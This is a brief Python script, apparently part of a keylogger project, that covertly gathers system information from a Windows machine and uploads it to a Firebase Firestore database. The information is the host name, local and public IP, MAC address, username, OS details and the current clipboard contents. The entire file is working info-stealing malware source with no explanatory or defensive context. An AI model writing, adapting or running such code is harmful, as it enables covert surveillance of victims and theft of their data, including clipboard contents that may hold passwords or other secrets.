#!/usr/bin/env python3

import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
import platform
import getpass
from datetime import datetime
import socket
import getmac
import requests
import win32clipboard


cred = credentials.Certificate("keylogger-firebase-adminsdk.json")
firebase_admin.initialize_app(cred)


host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
timestamp = datetime.now()
username = getpass.getuser()
db = firestore.client()
mac_address = getmac.get_mac_address()
response = requests.get('https://api.ipify.org')
public_ip = response.text

devices = {}

clipboard = ''
try:
    win32clipboard.OpenClipboard()
    pasted_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    clipboard = pasted_data
except:
    clipboard = "Clipboard could not be copied"

data = {
    "1. Host Name": host_name,
    "2. IP Address": ip_address,
    "3. MAC Address": mac_address,
    "4. Public IP Address": public_ip,
    "5. Username": username,
    "6. Current Timestamp": timestamp,
    '7. System': platform.system(),
    '8. Release': platform.release(),
    '9. Version': platform.version(),
    '10. Platform': platform.platform(),
    '11. Architecture': platform.architecture(),
    '12. Clipboard': clipboard,
}



doc_ref = db.collection("datacollection").document()

doc_ref.set(data)